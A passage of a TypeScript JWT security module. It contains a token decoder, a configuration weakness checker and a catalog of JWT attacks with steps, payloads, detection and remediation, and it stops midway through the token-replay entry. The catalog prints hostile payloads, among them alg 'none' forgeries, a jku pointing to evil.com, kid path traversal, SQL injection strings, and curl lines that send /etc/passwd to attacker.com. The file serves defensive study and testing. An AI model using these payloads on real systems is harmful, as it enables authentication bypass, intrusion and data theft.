/**
 * jwt-security.ts — Comprehensive JWT Security Knowledge Base
 *
 * Deep expertise module covering the full JWT attack surface:
 *   1. JWT structure decoding & analysis (header, payload, signature)
 *   2. 12 attack patterns with payloads, PoCs, and detection methods
 *   3. 8 defense playbooks with implementation guidance
 *   4. Configuration analysis & weakness detection
 *   5. Library-specific vulnerability signatures
 *   6. Compliance mapping (OWASP, NIST, CWE)
 *
 * Built for 5-star agent rating: runtime decode, attack catalog,
 * defense playbooks, config analysis, and automated test generation.
 */

// ─────────────────────────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────────────────────────

/** All JWT signing algorithms the agent should recognize. */
export type JwtAlgorithm =
  | "HS256" | "HS384" | "HS512"        // HMAC symmetric
  | "RS256" | "RS384" | "RS512"        // RSA asymmetric
  | "ES256" | "ES384" | "ES512"        // ECDSA
  | "PS256" | "PS384" | "PS512"        // RSA-PSS
  | "EdDSA"                            // Edwards curve
  | "none";                            // No signature

/** JWT attack technique identifiers. */
export type JwtAttackType =
  | "none-algorithm"
  | "algorithm-confusion"
  | "jwk-self-signed"
  | "jku-poisoning"
  | "x5c-chain-injection"
  | "kid-path-traversal"
  | "kid-sql-injection"
  | "kid-command-injection"
  | "claim-tampering"
  | "token-replay"
  | "cross-service-confusion"
  | "nested-jwt-abuse";

/** JWT defense category identifiers. */
export type JwtDefenseCategory =
  | "algorithm-pinning"
  | "key-management"
  | "claim-validation"
  | "token-lifecycle"
  | "library-hardening"
  | "transport-security"
  | "monitoring"
  | "architecture";

/** Severity levels aligned with CVSS 3.1 qualitative scale. */
export type JwtSeverity = "critical" | "high" | "medium" | "low" | "info";

/** A decoded JWT token structure. */
export interface DecodedJwt {
  raw: string;
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
  headerB64: string;
  payloadB64: string;
  isValid: boolean;
  warnings: string[];
  weaknesses: string[];
}

/** A JWT attack pattern with full details. */
export interface JwtAttackPattern {
  id: string;
  name: string;
  attack: JwtAttackType;
  severity: JwtSeverity;
  cvss: number;
  cwes: string[];
  description: string;
  prerequisites: string[];
  steps: string[];
  payloads: string[];
  indicators: string[];
  detectionMethods: string[];
  automatable: boolean;
  tools: string[];
  remediation: string[];
  references: string[];
}

/** A JWT defense playbook with implementation details. */
export interface JwtDefensePlaybook {
  id: string;
  name: string;
  category: JwtDefenseCategory;
  description: string;
  mitigatesAttacks: JwtAttackType[];
  effectiveness: number; // 1-10
  implementation: {
    principle: string;
    codeExamples: { language: string; code: string; notes: string }[];
    configuration: string[];
    commonMistakes: string[];
  };
  testCases: { name: string; description: string; steps: string[]; expected: string; automatable: boolean }[];
  references: string[];
}

/** JWT configuration weakness found during analysis. */
export interface JwtConfigWeakness {
  id: string;
  name: string;
  severity: JwtSeverity;
  description: string;
  recommendation: string;
  cwe: string;
}

/** Library-specific JWT vulnerability signature. */
export interface JwtLibraryVuln {
  library: string;
  language: string;
  version: string;
  vulnerability: string;
  cve: string;
  severity: JwtSeverity;
  description: string;
  fix: string;
}

// ─────────────────────────────────────────────────────────────────────────────
//  JWT Decode & Analysis Engine
// ─────────────────────────────────────────────────────────────────────────────

/** Base64url decode (RFC 7515). */
function base64urlDecode(input: string): string {
  let padded = input.replace(/-/g, "+").replace(/_/g, "/");
  while (padded.length % 4 !== 0) padded += "=";
  return Buffer.from(padded, "base64").toString("utf-8");
}

/**
 * Decode a JWT string into its components with security analysis.
 * This is a PASSIVE decoder — it does NOT verify signatures.
 * Use this to inspect tokens, detect weaknesses, and guide testing.
 */
export function decodeJwt(token: string): DecodedJwt {
  const warnings: string[] = [];
  const weaknesses: string[] = [];

  const parts = token.trim().split(".");
  if (parts.length < 2 || parts.length > 3) {
    return {
      raw: token,
      header: {},
      payload: {},
      signature: "",
      headerB64: "",
      payloadB64: "",
      isValid: false,
      warnings: ["Invalid JWT format: expected 2-3 dot-separated parts"],
      weaknesses: [],
    };
  }

  const [headerB64 = "", payloadB64 = "", signatureB64 = ""] = parts;

  // Decode header
  let header: Record<string, unknown> = {};
  try {
    header = JSON.parse(base64urlDecode(headerB64));
  } catch {
    warnings.push("Failed to decode JWT header as JSON");
    return { raw: token, header: {}, payload: {}, signature: signatureB64, headerB64, payloadB64, isValid: false, warnings, weaknesses };
  }

  // Decode payload
  let payload: Record<string, unknown> = {};
  try {
    payload = JSON.parse(base64urlDecode(payloadB64));
  } catch {
    warnings.push("Failed to decode JWT payload as JSON");
    return { raw: token, header, payload: {}, signature: signatureB64, headerB64, payloadB64, isValid: false, warnings, weaknesses };
  }

  // ── Header Analysis ──
  const alg = header.alg as string | undefined;

  if (!alg) {
    weaknesses.push("[CRITICAL] No 'alg' claim in header — library may default to insecure algorithm");
  } else if (alg === "none") {
    weaknesses.push("[CRITICAL] Algorithm is 'none' — token is unsigned, anyone can forge");
  } else if (alg === "HS256" || alg === "HS384" || alg === "HS512") {
    warnings.push(`Symmetric algorithm ${alg} — secret key shared between signer and verifier`);
  }

  if (header.jwk) {
    weaknesses.push("[HIGH] Embedded 'jwk' in header — attacker can supply their own public key for verification");
  }
  if (header.jku) {
    weaknesses.push("[HIGH] 'jku' header present — if not validated, attacker can point to malicious JWKS URL");
  }
  if (header.x5c) {
    weaknesses.push("[HIGH] 'x5c' header present — if cert chain not validated, attacker can self-sign");
  }
  if (header.kid && typeof header.kid === "string") {
    if (header.kid.includes("/") || header.kid.includes("..") || header.kid.includes("\\")) {
      weaknesses.push("[CRITICAL] 'kid' contains path characters — possible path traversal attack");
    }
    if (/['";]/.test(header.kid)) {
      weaknesses.push("[CRITICAL] 'kid' contains SQL/injection characters — possible kid injection");
    }
  }

  // ── Payload / Claims Analysis ──
  const now = Math.floor(Date.now() / 1000);
  const exp = payload.exp as number | undefined;
  const nbf = payload.nbf as number | undefined;
  const iat = payload.iat as number | undefined;
  const iss = payload.iss as string | undefined;
  const aud = payload.aud as string | string[] | undefined;
  const sub = payload.sub as string | undefined;
  const jti = payload.jti as string | undefined;

  if (!exp) {
    weaknesses.push("[HIGH] No 'exp' (expiration) claim — token never expires");
  } else {
    if (exp < now) {
      warnings.push(`Token expired: exp=${exp} (${new Date(exp * 1000).toISOString()})`);
    }
    if (exp - (iat ?? now) > 86400) {
      weaknesses.push(`[MEDIUM] Token lifetime > 24h (${Math.round((exp - (iat ?? now)) / 3600)}h) — prefer short-lived tokens`);
    }
    if (exp - (iat ?? now) > 604800) {
      weaknesses.push("[HIGH] Token lifetime > 7 days — excessive, easily abused if stolen");
    }
  }

  if (!iss) {
    weaknesses.push("[MEDIUM] No 'iss' (issuer) claim — cannot verify token origin");
  }
  if (!aud) {
    weaknesses.push("[MEDIUM] No 'aud' (audience) claim — token accepted by any service (cross-service confusion risk)");
  }
  if (!sub) {
    warnings.push("No 'sub' (subject) claim — cannot identify token owner");
  }
  if (!jti) {
    warnings.push("No 'jti' (JWT ID) claim — token replay cannot be detected via ID tracking");
  }
  if (!nbf) {
    warnings.push("No 'nbf' (not before) claim — token valid immediately from issuance");
  }

  // Check for sensitive data in payload
  const sensitiveKeys = ["password", "passwd", "pwd", "secret", "ssn", "credit_card", "cc_number", "api_key", "private_key"];
  for (const key of Object.keys(payload)) {
    if (sensitiveKeys.some((s) => key.toLowerCase().includes(s))) {
      weaknesses.push(`[HIGH] Payload contains sensitive-looking claim '${key}' — JWTs are base64-encoded, NOT encrypted`);
    }
  }

  // Check for privilege-related claims
  const privKeys = ["role", "roles", "admin", "is_admin", "isAdmin", "permissions", "scope", "groups", "group"];
  const foundPrivClaims = Object.keys(payload).filter((k) => privKeys.includes(k.toLowerCase()));
  if (foundPrivClaims.length > 0) {
    warnings.push(`Privilege claims found: ${foundPrivClaims.join(", ")} — ensure server validates these server-side`);
  }

  // Signature analysis
  if (!signatureB64 || signatureB64.length === 0) {
    weaknesses.push("[CRITICAL] Empty signature — token is unsigned");
  }

  return {
    raw: token,
    header,
    payload,
    signature: signatureB64,
    headerB64,
    payloadB64,
    isValid: weaknesses.filter((w) => w.includes("[CRITICAL]")).length === 0,
    warnings,
    weaknesses,
  };
}

/**
 * Analyze a JWT configuration (algorithm, key type, claim requirements)
 * and return weaknesses.
 */
export function analyzeJwtConfig(config: {
  algorithm?: string;
  acceptedAlgorithms?: string[];
  keyLength?: number;
  requireExp?: boolean;
  requireIss?: boolean;
  requireAud?: boolean;
  maxLifetime?: number;
  allowNone?: boolean;
  validateKid?: boolean;
  allowJwkHeader?: boolean;
  allowJkuHeader?: boolean;
}): JwtConfigWeakness[] {
  const weaknesses: JwtConfigWeakness[] = [];

  if (config.allowNone || config.acceptedAlgorithms?.includes("none")) {
    weaknesses.push({
      id: "jwt-cfg-none",
      name: "None Algorithm Allowed",
      severity: "critical",
      description: "The 'none' algorithm is accepted, allowing unsigned tokens to pass verification.",
      recommendation: "Explicitly reject 'none' algorithm. Pin allowed algorithms to a whitelist.",
      cwe: "CWE-327",
    });
  }

  if (config.acceptedAlgorithms && config.acceptedAlgorithms.length > 3) {
    weaknesses.push({
      id: "jwt-cfg-many-algs",
      name: "Too Many Accepted Algorithms",
      severity: "medium",
      description: `${config.acceptedAlgorithms.length} algorithms accepted — increases attack surface for algorithm confusion.`,
      recommendation: "Accept only the algorithms you intentionally use (ideally 1-2).",
      cwe: "CWE-327",
    });
  }

  const alg = config.algorithm ?? "";
  const hasSymmetric = ["HS256", "HS384", "HS512"].some((a) =>
    config.acceptedAlgorithms?.includes(a) || alg === a
  );
  const hasAsymmetric = ["RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512", "EdDSA"].some((a) =>
    config.acceptedAlgorithms?.includes(a) || alg === a
  );
  if (hasSymmetric && hasAsymmetric) {
    weaknesses.push({
      id: "jwt-cfg-mixed-algs",
      name: "Mixed Symmetric/Asymmetric Algorithms",
      severity: "critical",
      description: "Both HMAC (symmetric) and RSA/ECDSA (asymmetric) algorithms accepted — vulnerable to algorithm confusion attacks.",
      recommendation: "Use ONLY asymmetric algorithms (RS256/ES256) or ONLY symmetric. Never mix.",
      cwe: "CWE-347",
    });
  }

  if (config.keyLength && config.keyLength < 256 && hasSymmetric) {
    weaknesses.push({
      id: "jwt-cfg-weak-key",
      name: "Weak HMAC Key Length",
      severity: "high",
      description: `HMAC key length ${config.keyLength} bits is below recommended minimum of 256 bits.`,
      recommendation: "Use a key at least as long as the hash output (256 bits for HS256, 384 for HS384, 512 for HS512).",
      cwe: "CWE-326",
    });
  }

  if (!config.requireExp) {
    weaknesses.push({
      id: "jwt-cfg-no-exp",
      name: "Expiration Not Required",
      severity: "high",
      description: "Token expiration (exp) claim is not enforced — tokens may never expire.",
      recommendation: "Always require and validate the 'exp' claim. Maximum lifetime: 15-60 minutes for access tokens.",
      cwe: "CWE-613",
    });
  }

  if (!config.requireIss) {
    weaknesses.push({
      id: "jwt-cfg-no-iss",
      name: "Issuer Not Validated",
      severity: "medium",
      description: "Issuer (iss) claim is not validated — tokens from any issuer are accepted.",
      recommendation: "Validate 'iss' against a known issuer URL/identifier.",
      cwe: "CWE-345",
    });
  }

  if (!config.requireAud) {
    weaknesses.push({
      id: "jwt-cfg-no-aud",
      name: "Audience Not Validated",
      severity: "medium",
      description: "Audience (aud) claim is not validated — tokens intended for other services may be accepted (cross-service confusion).",
      recommendation: "Validate 'aud' matches your service identifier.",
      cwe: "CWE-345",
    });
  }

  if (config.maxLifetime && config.maxLifetime > 3600) {
    weaknesses.push({
      id: "jwt-cfg-long-lifetime",
      name: "Excessive Token Lifetime",
      severity: "medium",
      description: `Max token lifetime ${config.maxLifetime}s (${Math.round(config.maxLifetime / 60)}min) exceeds recommended 60 minutes.`,
      recommendation: "Use short-lived access tokens (15-60min) with refresh token rotation.",
      cwe: "CWE-613",
    });
  }

  if (config.allowJwkHeader) {
    weaknesses.push({
      id: "jwt-cfg-jwk-header",
      name: "JWK Header Allowed",
      severity: "high",
      description: "JWK header parameter is accepted — attacker can embed their own key for self-verification.",
      recommendation: "Reject JWK header parameter. Use a trusted JWKS endpoint for key discovery.",
      cwe: "CWE-347",
    });
  }

  if (config.allowJkuHeader) {
    weaknesses.push({
      id: "jwt-cfg-jku-header",
      name: "JKU Header Allowed",
      severity: "high",
      description: "JKU header parameter is accepted — attacker can redirect key lookup to malicious JWKS URL.",
      recommendation: "Reject JKU header or strictly validate against a whitelist of trusted JWKS URLs.",
      cwe: "CWE-347",
    });
  }

  if (!config.validateKid) {
    weaknesses.push({
      id: "jwt-cfg-kid-unvalidated",
      name: "KID Not Validated",
      severity: "high",
      description: "The 'kid' header is not validated/sanitized — vulnerable to path traversal, SQL injection, or command injection via kid.",
      recommendation: "Sanitize and allowlist 'kid' values. Never use them in file paths or SQL queries directly.",
      cwe: "CWE-20",
    });
  }

  return weaknesses;
}

// ─────────────────────────────────────────────────────────────────────────────
//  JWT Attack Pattern Catalog (12 attack types)
// ─────────────────────────────────────────────────────────────────────────────

export const JWT_ATTACK_PATTERNS: JwtAttackPattern[] = [
  {
    id: "jwt-atk-01",
    name: "None Algorithm Bypass",
    attack: "none-algorithm",
    severity: "critical",
    cvss: 9.8,
    cwes: ["CWE-327", "CWE-347"],
    description:
      "Change the JWT algorithm to 'none' (case variations: None, NONE, nOnE) and remove the signature. " +
      "If the server doesn't explicitly reject unsigned tokens, authorization is completely bypassed.",
    prerequisites: [
      "Obtain a valid JWT (from login, session, or response inspection)",
      "Server uses a library that doesn't reject 'none' by default",
    ],
    steps: [
      "1. Decode the JWT header (base64url decode the first segment)",
      "2. Change 'alg' to 'none' (try case variations: None, NONE, nOnE, nonE)",
      "3. Modify payload claims as desired (e.g., change 'role' to 'admin', 'sub' to another user)",
      "4. Re-encode header and payload as base64url",
      "5. Construct new token: base64url(header).base64url(payload). (trailing dot, empty signature)",
      "6. Also try: base64url(header).base64url(payload) (no trailing dot)",
      "7. Send the forged token and observe if the server accepts it",
    ],
    payloads: [
      '{"alg":"none","typ":"JWT"}',
      '{"alg":"None","typ":"JWT"}',
      '{"alg":"NONE","typ":"JWT"}',
      '{"alg":"nOnE","typ":"JWT"}',
      '{"alg":"nonE","typ":"JWT"}',
    ],
    indicators: [
      "Server returns 200/success with modified claims",
      "User identity changes to match forged 'sub'",
      "Elevated privileges observed (admin access from regular token)",
    ],
    detectionMethods: [
      "Log all JWT algorithm values at verification — alert on 'none' variants",
      "WAF rule: block requests where JWT header contains alg=none",
      "Unit test: ensure library rejects none/None/NONE/nOnE",
    ],
    automatable: true,
    tools: ["jwt_tool", "Burp Suite JWT Editor", "python-jose", "pyjwt", "jwt.io"],
    remediation: [
      "Explicitly pin allowed algorithms in verification config",
      "Use library options to reject 'none': { algorithms: ['RS256'] }",
      "Never rely on the JWT header's alg claim — enforce server-side",
    ],
    references: [
      "https://portswigger.net/web-security/jwt/algorithm-confusion",
      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
      "CVE-2015-9235 (pyjwt none algorithm)",
    ],
  },
  {
    id: "jwt-atk-02",
    name: "Algorithm Confusion (RS256 → HS256)",
    attack: "algorithm-confusion",
    severity: "critical",
    cvss: 9.8,
    cwes: ["CWE-327", "CWE-347"],
    description:
      "When a server uses RS256 (asymmetric), an attacker changes the algorithm to HS256 (symmetric) " +
      "and signs the token with the server's PUBLIC key. If the library uses the same verify function " +
      "for both algorithms, it treats the public key as the HMAC secret — and the signature validates.",
    prerequisites: [
      "Server uses RS256 for JWT signing",
      "Server's public key is obtainable (JWKS endpoint, .well-known, x5c, certificate)",
      "Server library doesn't separate symmetric/asymmetric key handling",
    ],
    steps: [
      "1. Obtain the server's RSA public key (try /.well-known/jwks.json, /oauth/jwks, /api/keys)",
      "2. Convert the public key to PEM format if needed (JWK → PEM)",
      "3. Decode the JWT header",
      "4. Change 'alg' from 'RS256' to 'HS256'",
      "5. Modify payload claims (role, sub, permissions)",
      "6. Sign the token using HMAC-SHA256 with the public key as the secret",
      "7. Send the forged token — server may verify HMAC with its public key material",
    ],
    payloads: [
      '{"alg":"HS256","typ":"JWT"}  // signed with RSA public key bytes as HMAC secret',
      '{"alg":"HS384","typ":"JWT"}  // try HS384 variant',
      '{"alg":"HS512","typ":"JWT"}  // try HS512 variant',
    ],
    indicators: [
      "Token with HS256 alg accepted by RS256-configured server",
      "Payload modifications (role escalation) take effect",
      "Public key exposed at predictable endpoints",
    ],
    detectionMethods: [
      "Log a mismatch between configured algorithm and token's alg claim",
      "Alert if token alg changes from asymmetric to symmetric",
      "Rate-limit /jwks.json and /.well-known endpoints",
    ],
    automatable: true,
    tools: ["jwt_tool -X k -pk pubkey.pem", "Burp Suite JWT Editor", "python pyjwt", "jose CLI"],
    remediation: [
      "Pin allowed algorithms: { algorithms: ['RS256'] } — never accept HS* if configured for RS*",
      "Use separate key objects for symmetric/asymmetric verification",
      "Modern libraries (jose, node-jsonwebtoken ≥9) handle this — ensure you're updated",
      "Use asymmetric algorithms (RS256/ES256) — they're inherently immune if properly configured",
    ],
    references: [
      "https://portswigger.net/web-security/jwt/algorithm-confusion",
      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
      "CVE-2016-10555 (jsonwebtoken key confusion)",
    ],
  },
  {
    id: "jwt-atk-03",
    name: "JWK Self-Signed Injection",
    attack: "jwk-self-signed",
    severity: "critical",
    cvss: 9.1,
    cwes: ["CWE-347"],
    description:
      "Embed an attacker-controlled RSA/EC public key in the JWT's 'jwk' header parameter. " +
      "If the server uses the embedded JWK for verification instead of its own key store, " +
      "the attacker can self-sign arbitrary tokens.",
    prerequisites: [
      "Server accepts and uses the 'jwk' header parameter for verification",
      "No validation that the JWK belongs to a trusted key",
    ],
    steps: [
      "1. Generate an RSA or EC key pair (attacker-controlled)",
      "2. Decode the target JWT",
      "3. Add the attacker's public key as a 'jwk' parameter in the JWT header",
      "4. Modify payload claims as desired",
      "5. Sign the token with the attacker's private key",
      "6. Send the self-signed token — server may use embedded JWK to verify",
    ],
    payloads: [
      '{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker-n>","e":"AQAB"}}',
    ],
    indicators: [
      "Token with embedded JWK is accepted",
      "Server doesn't validate JWK against a trusted key store",
    ],
    detectionMethods: [
      "Log and alert on any JWT containing a 'jwk' header parameter",
      "WAF rule: strip or reject JWTs with embedded JWK",
    ],
    automatable: true,
    tools: ["jwt_tool -X i", "Burp Suite JWT Editor", "mkjwk.org (key generation)"],
    remediation: [
      "Reject JWTs containing 'jwk' header parameter entirely",
      "Only use keys from your own JWKS endpoint or static key store",
      "Library config: disable JWK header processing",
    ],
    references: [
      "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection",
    ],
  },
  {
    id: "jwt-atk-04",
    name: "JKU URL Poisoning",
    attack: "jku-poisoning",
    severity: "critical",
    cvss: 9.1,
    cwes: ["CWE-347", "CWE-918"],
    description:
      "The 'jku' (JWK Set URL) header tells the server where to fetch the public key. " +
      "An attacker sets jku to a URL they control, hosts their own JWKS, and signs with the matching private key. " +
      "Can be combined with open redirects or SSRF for internal jku URLs.",
    prerequisites: [
      "Server follows the 'jku' header to fetch verification keys",
      "Insufficient validation of jku URL (no allowlist)",
    ],
    steps: [
      "1. Generate an RSA key pair",
      "2. Host the public key as a JWKS at attacker-controlled URL (e.g., https://evil.com/.well-known/jwks.json)",
      "3. Set 'jku' in JWT header to attacker's URL",
      "4. Sign the token with attacker's private key",
      "5. Send the token — server fetches attacker's JWKS and verifies successfully",
      "6. Advanced: use an open redirect on the target domain to bypass URL allowlists",
    ],
    payloads: [
      '{"alg":"RS256","jku":"https://evil.com/.well-known/jwks.json","kid":"attacker-key-1"}',
      '{"alg":"RS256","jku":"https://target.com/redirect?url=https://evil.com/jwks.json"}',
    ],
    indicators: [
      "Server makes outbound HTTP request to fetch JWK set",
      "Token with custom jku is accepted",
      "Outbound DNS/HTTP from server observed",
    ],
    detectionMethods: [
      "Log all outbound requests from JWT verification",
      "Alert on JKU URLs not matching trusted issuer domain",
      "SSRF protection: block requests to non-allowlisted URLs",
    ],
    automatable: true,
    tools: ["jwt_tool -X s", "Burp Collaborator (for SSRF detection)", "custom JWKS server"],
    remediation: [
      "Reject JKU header entirely or strictly allowlist trusted JWKS URLs",
      "Hardcode your JWKS endpoint — never follow JKU from the token",
      "If JKU is needed, validate it matches your exact issuer domain with no redirects",
    ],
    references: [
      "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection",
    ],
  },
  {
    id: "jwt-atk-05",
    name: "X5C Certificate Chain Injection",
    attack: "x5c-chain-injection",
    severity: "high",
    cvss: 8.1,
    cwes: ["CWE-347", "CWE-295"],
    description:
      "The 'x5c' header contains an X.509 certificate chain. An attacker generates a self-signed " +
      "certificate, includes it in x5c, makes the JWT header reference it, and signs with the matching " +
      "private key. If the server trusts x5c without validating the chain against a CA, the token verifies.",
    prerequisites: [
      "Server accepts x5c header and uses the embedded certificate for verification",
      "No validation of certificate chain against trusted CAs",
    ],
    steps: [
      "1. Generate a self-signed X.509 certificate with an RSA/EC key pair",
      "2. Base64-encode the certificate (DER format)",
      "3. Embed the certificate in the JWT's 'x5c' header as an array",
      "4. Sign the JWT with the matching private key",
      "5. Send the self-signed token",
    ],
    payloads: [
      '{"alg":"RS256","x5c":["MIICpDCCAYw...self-signed-cert..."]}',
    ],
    indicators: [
      "Token with embedded x5c certificate accepted",
      "Self-signed certificate not rejected",
    ],
    detectionMethods: [
      "Log presence of x5c header in incoming tokens",
      "Validate x5c chain against trusted CA certificates",
    ],
    automatable: true,
    tools: ["openssl (cert generation)", "jwt_tool", "Burp Suite JWT Editor"],
    remediation: [
      "Validate x5c certificate chain against known CA certificates",
      "Pin expected certificate fingerprints",
      "Reject tokens with x5c unless your architecture requires it",
    ],
    references: [
      "https://www.rfc-editor.org/rfc/rfc7515#section-4.1.6",
    ],
  },
  {
    id: "jwt-atk-06",
    name: "KID Path Traversal",
    attack: "kid-path-traversal",
    severity: "critical",
    cvss: 9.1,
    cwes: ["CWE-22", "CWE-347"],
    description:
      "If the server uses the 'kid' (Key ID) header to read a signing key from the filesystem, " +
      "an attacker can set kid to a path traversal string (e.g., '/dev/null', '../../../../dev/null') " +
      "to make the server read a predictable empty file as the key. Then sign with an empty secret.",
    prerequisites: [
      "Server reads signing key from filesystem based on 'kid' value",
      "'kid' value is not sanitized or allowlisted",
    ],
    steps: [
      "1. Decode the JWT header",
      "2. Change 'kid' to '../../../../dev/null' or '/dev/null'",
      "3. Change 'alg' to 'HS256' (symmetric)",
      "4. Sign the JWT with an empty string as the HMAC secret",
      "5. Send the forged token — server reads /dev/null as empty key, empty secret verifies",
      "6. Alternative: try kid='../../../../etc/hostname' and sign with hostname content",
    ],
    payloads: [
      '{"alg":"HS256","kid":"/dev/null"}',
      '{"alg":"HS256","kid":"../../../../dev/null"}',
      '{"alg":"HS256","kid":"../../../../etc/hostname"}',
      '{"alg":"HS256","kid":"../../../proc/sys/kernel/hostname"}',
    ],
    indicators: [
      "Token accepted with path traversal characters in kid",
      "File read errors in server logs when kid contains unusual paths",
      "Token validated with empty or predictable secret",
    ],
    detectionMethods: [
      "Input validation: reject kid values containing '/', '..', '\\\\'",
      "Log and alert on filesystem errors during JWT verification",
      "Allowlist valid kid values",
    ],
    automatable: true,
    tools: ["jwt_tool -X k", "Burp Suite", "manual curl"],
    remediation: [
      "Allowlist valid kid values — never use kid as a file path directly",
      "Store keys in a database or KMS, not filesystem",
      "Sanitize kid: reject values with /, .., \\, null bytes",
    ],
    references: [
      "https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-using-the-kid-parameter",
    ],
  },
  {
    id: "jwt-atk-07",
    name: "KID SQL Injection",
    attack: "kid-sql-injection",
    severity: "critical",
    cvss: 9.8,
    cwes: ["CWE-89", "CWE-347"],
    description:
      "If the server queries a database to look up the signing key by 'kid', an unsanitized kid " +
      "is vulnerable to SQL injection. The attacker can inject SQL to return a known key value, " +
      "then sign the JWT with that value.",
    prerequisites: [
      "Server looks up signing key from database using 'kid' parameter",
      "'kid' is interpolated into SQL query without parameterization",
    ],
    steps: [
      "1. Identify that kid is used in a database query (error observation, timing)",
      "2. Set kid to SQL injection payload: \"' UNION SELECT 'attack-secret' -- \"",
      "3. The query returns 'attack-secret' as the signing key",
      "4. Sign the JWT with HS256 using 'attack-secret' as the HMAC key",
      "5. Send the forged token — it verifies against the injected key",
    ],
    payloads: [
      "' UNION SELECT 'AAA' -- ",
      "' UNION SELECT '' -- ",
      "' OR '1'='1",
      "'; DROP TABLE keys; --",
    ],
    indicators: [
      "SQL error messages when unusual kid values are sent",
      "Timing differences between existing and non-existing kid values",
      "Token accepted when kid contains SQL metacharacters",
    ],
    detectionMethods: [
      "WAF: detect SQL patterns in JWT kid header",
      "Parameterized queries — no injection possible",
      "Log SQL errors during JWT verification as security events",
    ],
    automatable: true,
    tools: ["jwt_tool", "sqlmap (kid parameter)", "Burp Suite"],
    remediation: [
      "Use parameterized/prepared statements for kid lookups",
      "Allowlist valid kid values (UUIDs only)",
      "Use a static JWKS endpoint instead of database key lookup",
    ],
    references: [
      "https://owasp.org/www-community/attacks/SQL_Injection",
    ],
  },
  {
    id: "jwt-atk-08",
    name: "KID Command Injection",
    attack: "kid-command-injection",
    severity: "critical",
    cvss: 9.8,
    cwes: ["CWE-78", "CWE-347"],
    description:
      "If the server passes the 'kid' value to a system command (e.g., to look up keys via a script), " +
      "an attacker can inject OS commands. This is rarer but devastating — full RCE.",
    prerequisites: [
      "Server passes kid to a shell command for key retrieval",
      "No sanitization of kid value before command execution",
    ],
    steps: [
      "1. Set kid to a command injection payload: `; echo 'attack' > /tmp/pwned;`",
      "2. Or exfiltration: `; curl https://attacker.com/steal?key=$(cat /etc/passwd);`",
      "3. Sign JWT with any secret (the command already executed)",
      "4. Observe side effects: file creation, DNS callbacks, etc.",
    ],
    payloads: [
      "; echo test > /tmp/jwt-rce;",
      "| curl https://attacker.com/callback",
      "$(whoami)",
      "`id`",
    ],
    indicators: [
      "Server executes commands when kid contains shell metacharacters",
      "DNS/HTTP callbacks observed when kid contains exfiltration payloads",
      "Server errors referencing command execution",
    ],
    detectionMethods: [
      "Never pass kid to shell commands",
      "WAF: detect shell metacharacters in JWT headers",
      "Runtime: monitor for unexpected process spawning during auth",
    ],
    automatable: true,
    tools: ["jwt_tool", "Burp Collaborator", "manual curl"],
    remediation: [
      "NEVER pass JWT header values to system commands",
      "Use a key store/database with parameterized lookups",
      "If shell interaction is unavoidable, use execFile with array args (no shell interpolation)",
    ],
    references: [
      "https://owasp.org/www-community/attacks/Command_Injection",
    ],
  },
  {
    id: "jwt-atk-09",
    name: "Claim Tampering & Privilege Escalation",
    attack: "claim-tampering",
    severity: "high",
    cvss: 8.8,
    cwes: ["CWE-285", "CWE-269"],
    description:
      "Modify JWT payload claims (role, sub, permissions, scope, groups, is_admin) to " +
      "escalate privileges. This requires combining with another attack (none alg, confusion, etc.) " +
      "to forge a valid signature, OR exploiting a server that doesn't validate signatures properly.",
    prerequisites: [
      "Ability to forge valid JWT signatures (via any attack in this catalog)",
      "Server uses JWT claims for authorization decisions",
      "Server trusts JWT claims without additional server-side validation",
    ],
    steps: [
      "1. Decode the JWT payload",
      "2. Identify authorization-relevant claims (role, sub, permissions, scope, groups, admin flags)",
      "3. Modify claims: set role to 'admin', change sub to target user ID, add elevated permissions",
      "4. Forge the signature using an applicable attack technique",
      "5. Test: access admin endpoints, other users' resources, perform privileged actions",
    ],
    payloads: [
      '{"sub":"admin","role":"superadmin","permissions":["*"]}',
      '{"sub":"<target-user-id>","scope":"admin:all"}',
      '{"sub":"1","is_admin":true,"groups":["administrators"]}',
    ],
    indicators: [
      "Token with modified claims grants elevated access",
      "Different user identity accepted",
      "Admin panel accessible with modified token",
    ],
    detectionMethods: [
      "Audit log: compare token claims against user database records",
      "Anomaly detection: alert when user's claims differ from stored permissions",
      "Session binding: tie tokens to session fingerprints",
    ],
    automatable: true,
    tools: ["jwt_tool", "Burp Suite JWT Editor", "jwt.io", "custom scripts"],
    remediation: [
      "Always validate claims against a server-side source of truth (database/IdP)",
      "Don't store authorization data solely in JWT claims",
      "Implement proper signature validation first — claims tampering requires signature bypass",
      "Use opaque access tokens + token introspection for sensitive operations",
    ],
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
    ],
  },
  {
    id: "jwt-atk-10",
    name: "Token Replay Attack",
    attack: "token-replay",
    severity: "medium",
    cvss: 6.5,
    cwes: ["CWE-294"],
    description:
      "Capture a valid JWT (via MITM, XSS, log exposure, or leaked URL) and replay it to " +
      "impersonate the user. Without jti tracking, exp enforcement, and token binding, " +
      "stolen tokens remain valid until natural expiration.",
    prerequisites: [
      "Ability to capture a valid JWT (network sniffing, XSS, log access, referer leakage)",
      "No token replay detection (jti tracking, client fingerprinting)",
    ],
    steps: [
      "1. Capture a valid JWT (intercept via proxy, extract from logs, steal via XSS)",
      "2. If token is in URL parameters, check referer leakage to third-party sites",
      "3. Replay the token in Authorization header to the target API",
      "4. If token has expired, check if server properly enforces 'exp' claim",
      "5. Try from different IP/device to test if token is bound",
    ],
    payloads: [
      "Authorization: Bearer <stolen-token>",
    ],
    indicators: [
      "Same token used from multiple IPs simultaneously",
      "Token used after user has logged out",
      "Token in URL parameters (query string leakage risk)",
    ],
    detectionMethods: [
      "Track jti values and reject reuse after logout/revocation",
      "Monitor for same token from different IPs/fingerprints",
      "Log token usage patterns — alert on anomalies",
    ],
    automatable: true,
    tools: ["Burp Suite Repeater", "curl", "browser DevTools"],
    remediation: [
      "Short token lifetimes (15min access, rotate via refresh tokens)",
      "Use 'jti' claim with server-side tracking for replay detection",
